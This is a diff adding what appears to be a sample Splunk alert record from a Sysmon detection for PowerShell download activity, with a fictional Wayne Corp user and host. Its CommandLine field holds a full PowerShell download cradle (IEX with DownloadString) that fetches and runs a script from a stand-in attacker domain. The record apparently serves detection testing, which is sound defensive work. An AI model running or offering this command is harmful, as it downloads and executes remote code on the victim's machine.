@@ -1,0 +1,27 @@
+{
+  "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
+  "search_name": "Sysmon: PowerShell Download Activity (t8372)",
+  "app": "search",
+  "owner": "admin",
+  "server_uri": "https://127.0.0.1:8089",
+  "results_link": "http://127.0.0.1:8000/en-US/app/search/@go?sid=scheduler__admin__search__t8372_ps_download_at_1727841660.1",
+  "result": {
+    "_time": "2024-10-02T04:01:00Z",
+    "index": "wineventlog",
+    "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "host": "DESKTOP-BRUCE",
+    "Computer": "DESKTOP-BRUCE",
+    "User": "WAYNECORPINC\\bwayne",
+    "user": "WAYNECORPINC\\bwayne",
+    "EventCode": "1",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "CommandLine": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil-payload-distro.net/invoice.js')\"",
+    "url": "http://evil-payload-distro.net/invoice.js",
+    "domain": "evil-payload-distro.net",
+    "severity": "medium",
+    "signature": "PowerShell download cradle after browser activity",
+    "signature_id": "T1059.001"
+  }
+}
